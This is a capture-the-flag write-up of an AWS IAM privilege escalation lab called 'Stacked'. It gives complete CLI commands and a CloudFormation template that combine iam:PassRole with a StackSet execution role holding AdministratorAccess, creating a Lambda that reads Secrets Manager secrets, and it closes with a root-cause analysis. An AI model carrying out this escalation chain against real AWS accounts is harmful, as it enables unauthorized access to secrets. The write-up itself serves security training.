# HackSmarter AWS CTF — Stacked (Hard)

**Platform:** HackSmarter  
**Challenge:** Stacked (Hard)  
**Category:** AWS IAM Privilege Escalation  
**Difficulty:** Hard  
**Status:** Solved

## Challenge Overview

The objective was to perform an authenticated penetration test against an AWS environment using developer IAM credentials.

The goal was to identify a privilege escalation path and retrieve a flag stored in AWS Secrets Manager.

**Initial Credentials:**

```text
Access Key ID: AKIA****************
Secret Access Key: ************************************
```

**Flag:**

```text
HSM{7a3434a037844dbea414bd0d4c94****}
```

## Initial Access

Configure AWS CLI using the provided developer credentials:

```bash
aws configure --profile stacked
```

Verify the authenticated AWS identity:

```bash
aws sts get-caller-identity --profile stacked
```

**Result:**

```json
{
  "UserId": "AIDA6EFMG6VYBFJSNIN7G",
  "Account": "971023775088",
  "Arn": "arn:aws:iam::971023775088:user/cg_dev_lab"
}
```

The credentials belonged to the IAM user `cg_dev_lab`.

## IAM Enumeration

Enumerate IAM users, roles, and policies:

```bash
aws iam get-user --profile stacked
aws iam list-users --profile stacked
aws iam list-roles --profile stacked
aws iam list-policies --scope Local --profile stacked
```

The IAM user contained an interesting tag:

```json
{
  "Key": "Scenario",
  "Value": "serverless_passrole"
}
```

This suggested that the challenge involved IAM role passing through an AWS service.

**Identify attached policies:**

```bash
aws iam list-attached-user-policies \
  --user-name cg_dev_lab \
  --profile stacked
```

**Result:**

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "cg_dev_policy_lab",
      "PolicyArn": "arn:aws:iam::971023775088:policy/cg_dev_policy_lab"
    }
  ]
}
```

The developer user had one attached managed policy: `cg_dev_policy_lab`.

## IAM Policy Analysis

Retrieve the developer IAM policy:

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::971023775088:policy/cg_dev_policy_lab \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json \
  --profile stacked > /tmp/stacked-policy.json
```

The policy allowed several powerful permissions, including:

```text
iam:*
cloudformation:*
lambda:*
apigateway:*
logs:*
scheduler:*
pipes:*
```

However, it also contained explicit deny statements.

**Inspect the IAM privilege escalation restrictions:**

```bash
jq '.Statement[] | select(.Sid == "stopiamprivesc")' \
  /tmp/stacked-policy.json
```

**Result:**

```json
{
  "Action": [
    "iam:Create*",
    "iam:Delete*",
    "iam:Remove*",
    "iam:Update*",
    "iam:Attach*",
    "iam:Put*",
    "iam:Add*",
    "iam:Set*"
  ],
  "Effect": "Deny",
  "Resource": "*",
  "Sid": "stopiamprivesc"
}
```

The explicit deny prevented direct IAM privilege escalation techniques such as:

```text
iam:CreateRole
iam:AttachRolePolicy
iam:PutRolePolicy
iam:UpdateAssumeRolePolicy
```

However, `iam:PassRole` was not denied.

This was an important finding because the developer could potentially pass existing privileged roles to AWS services.

## Privileged Role Enumeration

During IAM enumeration, two interesting roles were discovered:

```text
AWSCloudFormationStackSetAdministrationRole-lab
AWSCloudFormationStackSetExecutionRole-lab
```

**Check the execution role's attached policies:**

```bash
aws iam list-attached-role-policies \
  --role-name AWSCloudFormationStackSetExecutionRole-lab \
  --profile stacked
```

**Result:**

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "AdministratorAccess",
      "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
    }
  ]
}
```

The StackSet execution role had the AWS-managed `AdministratorAccess` policy.

**Inspect the administration role's inline policies:**

```bash
aws iam list-role-policies \
  --role-name AWSCloudFormationStackSetAdministrationRole-lab \
  --profile stacked
```

**Result:**

```json
{
  "PolicyNames": [
    "AssumeExecutionRole"
  ]
}
```

Retrieve the inline policy:

```bash
aws iam get-role-policy \
  --role-name AWSCloudFormationStackSetAdministrationRole-lab \
  --policy-name AssumeExecutionRole \
  --profile stacked
```

**Result:**

```json
{
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": "sts:AssumeRole",
        "Effect": "Allow",
        "Resource": "arn:aws:iam::971023775088:role/AWSCloudFormationStackSetExecutionRole-lab"
      }
    ]
  }
}
```

The trust relationships showed that CloudFormation could assume the administration role, which could then assume the execution role.

**Potential attack chain:**

```text
Developer IAM User
        |
        | cloudformation:CreateStackSet
        | iam:PassRole
        v
CloudFormation StackSets
        |
        v
StackSet Administration Role
        |
        | sts:AssumeRole
        v
StackSet Execution Role
        |
        v
AdministratorAccess
```

## Verify IAM Permissions

Use IAM Policy Simulator to confirm the developer's effective permissions:

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::971023775088:user/cg_dev_lab \
  --action-names \
    iam:PassRole \
    iam:CreateRole \
    iam:AttachRolePolicy \
    cloudformation:CreateStack \
    cloudformation:CreateStackSet \
    cloudformation:CreateStackInstances \
    lambda:CreateFunction \
    secretsmanager:ListSecrets \
    secretsmanager:GetSecretValue \
  --profile stacked \
  --query 'EvaluationResults[].[EvalActionName,EvalDecision]' \
  --output table
```

**Result:**

| Action | Decision |
|---|---|
| `iam:PassRole` | allowed |
| `iam:CreateRole` | explicitDeny |
| `iam:AttachRolePolicy` | explicitDeny |
| `cloudformation:CreateStack` | allowed |
| `cloudformation:CreateStackSet` | allowed |
| `cloudformation:CreateStackInstances` | allowed |
| `lambda:CreateFunction` | allowed |
| `secretsmanager:ListSecrets` | implicitDeny |
| `secretsmanager:GetSecretValue` | implicitDeny |

The results confirmed that the developer could create CloudFormation StackSets and pass IAM roles but could not directly create IAM roles or access Secrets Manager.

**Exploitation approach:** Use CloudFormation StackSets with the existing privileged execution role to create an IAM role and Lambda function that can access AWS Secrets Manager.

## Exploitation — CloudFormation StackSets Privilege Escalation

**Create a working directory:**

```bash
mkdir -p ~/stacked-ctf
cd ~/stacked-ctf
```

**Create a CloudFormation template:**

```bash
cat > stackset.yaml <<'EOF'
AWSTemplateFormatVersion: '2010-09-09'
Description: Stacked CTF - Secrets Manager verification

Resources:
  ChallengeLambdaRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: stacked-ctf-lambda-role
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
            Action: sts:AssumeRole
      Policies:
        - PolicyName: ChallengeSecretsRead
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - secretsmanager:ListSecrets
                  - secretsmanager:GetSecretValue
                Resource: '*'

  ChallengeLambda:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: stacked-ctf-reader
      Runtime: python3.12
      Handler: index.handler
      Timeout: 30
      Role: !GetAtt ChallengeLambdaRole.Arn
      Code:
        ZipFile: |
          import boto3

          def handler(event, context):
              client = boto3.client("secretsmanager")
              secret_id = event.get("secret_id")

              if secret_id:
                  response = client.get_secret_value(
                      SecretId=secret_id
                  )
                  return {
                      "SecretString": response.get("SecretString"),
                      "SecretBinary": (
                          response["SecretBinary"].decode("utf-8")
                          if response.get("SecretBinary") else None
                      )
                  }

              paginator = client.get_paginator("list_secrets")
              names = []
              for page in paginator.paginate():
                  for secret in page.get("SecretList", []):
                      names.append(secret["Name"])

              return {"secrets": names}

Outputs:
  LambdaName:
    Value: !Ref ChallengeLambda
EOF
```

**Template explanation:**

The template creates two resources:

- `ChallengeLambdaRole`: An IAM role trusted by AWS Lambda, with `secretsmanager:ListSecrets` and `secretsmanager:GetSecretValue` permissions.
- `ChallengeLambda`: A Python Lambda function that lists available secret names or retrieves a specified secret using its execution role.

The key technique is that CloudFormation creates the IAM role using the privileged StackSet execution role rather than the original developer's permissions.

**Configure the AWS region:**

```bash
aws configure set region us-east-1 --profile stacked
```

**Create the StackSet:**

```bash
aws cloudformation create-stack-set \
  --stack-set-name stacked-ctf-test \
  --template-body file://stackset.yaml \
  --permission-model SELF_MANAGED \
  --administration-role-arn arn:aws:iam::971023775088:role/AWSCloudFormationStackSetAdministrationRole-lab \
  --execution-role-name AWSCloudFormationStackSetExecutionRole-lab \
  --capabilities CAPABILITY_NAMED_IAM \
  --region us-east-1 \
  --profile stacked
```

**Important parameters:**

- `--permission-model SELF_MANAGED`: Uses existing CloudFormation administration and execution roles.
- `--administration-role-arn`: Specifies the role that CloudFormation can assume.
- `--execution-role-name`: Specifies the execution role with `AdministratorAccess`.
- `--capabilities CAPABILITY_NAMED_IAM`: Acknowledges creation of named IAM resources.

**Result:**

```json
{
  "StackSetId": "stacked-ctf-test:b798314a-abce-4a38-992b-ae76de428711"
}
```

The StackSet was created successfully.

## Deploy the StackSet

Creating a StackSet only creates its definition. A StackSet instance must be deployed to provision the resources.

**Deploy to the target account:**

```bash
aws cloudformation create-stack-instances \
  --stack-set-name stacked-ctf-test \
  --accounts 971023775088 \
  --regions us-east-1 \
  --region us-east-1 \
  --profile stacked
```

**Check the deployment status:**

```bash
aws cloudformation list-stack-instances \
  --stack-set-name stacked-ctf-test \
  --region us-east-1 \
  --profile stacked \
  --output json
```

Initially, the operation was still running:

```json
{
  "Status": "OUTDATED",
  "StackInstanceStatus": {
    "DetailedStatus": "RUNNING"
  },
  "LastOperationId": "bae24a0e-6f21-4a00-b828-c157533cd283"
}
```

**Verify the operation result:**

```bash
aws cloudformation describe-stack-set-operation \
  --stack-set-name stacked-ctf-test \
  --operation-id bae24a0e-6f21-4a00-b828-c157533cd283 \
  --region us-east-1 \
  --profile stacked \
  --query 'StackSetOperation.[Status,StatusReason]' \
  --output json
```

**Result:**

```json
[
  "SUCCEEDED",
  null
]
```

CloudFormation stack events confirmed that both resources were successfully provisioned:

```text
ChallengeLambda       CREATE_COMPLETE
ChallengeLambdaRole   CREATE_COMPLETE
```

The developer could not directly create IAM roles, but CloudFormation successfully created an IAM role through the privileged StackSet execution role.

**Privilege escalation was successful.**

## Verify Lambda Function

Check whether the newly created Lambda function is active:

```bash
aws lambda get-function \
  --function-name stacked-ctf-reader \
  --region us-east-1 \
  --profile stacked \
  --query 'Configuration.[FunctionName,State,Role]' \
  --output json
```

**Result:**

```json
[
  "stacked-ctf-reader",
  "Active",
  "arn:aws:iam::971023775088:role/stacked-ctf-lambda-role"
]
```

The Lambda function was running with the newly created IAM role that had Secrets Manager permissions.

## Enumerate Secrets Manager

Invoke the Lambda function without specifying a `secret_id` to enumerate secret names:

```bash
aws lambda invoke \
  --function-name stacked-ctf-reader \
  --payload '{"action":"list"}' \
  --cli-binary-format raw-in-base64-out \
  --region us-east-1 \
  --profile stacked \
  /tmp/stacked-result.json

jq . /tmp/stacked-result.json
```

**Command explanation:**

- `lambda invoke`: Executes the Lambda function.
- `--payload '{"action":"list"}'`: Sends a JSON event without a secret ID, causing the handler to list secrets.
- `--cli-binary-format raw-in-base64-out`: Allows a raw JSON payload in AWS CLI v2.
- `/tmp/stacked-result.json`: Saves the Lambda response locally.
- `jq .`: Formats the JSON output.

**AWS Lambda response:**

```json
{
  "StatusCode": 200,
  "ExecutedVersion": "$LATEST"
}
```

**Response body:**

```json
{
  "secrets": [
    "cg-flag-lab"
  ]
}
```

The target secret was identified:

```text
cg-flag-lab
```

## Retrieve the Flag

Invoke the Lambda function again, passing the target secret name:

```bash
aws lambda invoke \
  --function-name stacked-ctf-reader \
  --payload '{"secret_id":"cg-flag-lab"}' \
  --cli-binary-format raw-in-base64-out \
  --region us-east-1 \
  --profile stacked \
  /tmp/stacked-flag.json

jq -r '.SecretString' /tmp/stacked-flag.json
```

The Lambda function used `secretsmanager:GetSecretValue` through its IAM execution role to retrieve the target secret.

**Result:**

```json
{
  "StatusCode": 200,
  "ExecutedVersion": "$LATEST"
}
```

**Flag:**

```text
HSM{7a3434a037844dbea414bd0d4c94****}
```

The challenge was successfully completed.

## Root Cause

The vulnerability was caused by excessive CloudFormation StackSets permissions combined with unrestricted IAM role passing and a privileged execution role.

The developer IAM user had:

```text
iam:PassRole
cloudformation:*
```

Although direct IAM modifications were explicitly denied, the developer could create CloudFormation StackSets using an existing execution role with `AdministratorAccess`.

CloudFormation then provisioned new privileged IAM resources on behalf of the developer.

**The explicit IAM deny restricted the developer's direct actions but did not prevent privilege escalation through a privileged AWS service execution role.**

## Conclusion

This challenge demonstrated an AWS IAM privilege escalation technique using CloudFormation StackSets and `iam:PassRole`.

By leveraging a privileged StackSet execution role, a developer IAM user bypassed restrictions on direct IAM role creation and deployed a Lambda function with Secrets Manager access.

The Lambda function successfully retrieved the challenge flag.

**Attack path:**

```text
Developer Credentials
    -> IAM Enumeration
    -> iam:PassRole + cloudformation:*
    -> CloudFormation StackSets
    -> AdministratorAccess Execution Role
    -> Create IAM Role and Lambda
    -> AWS Secrets Manager
    -> Retrieve Flag
```
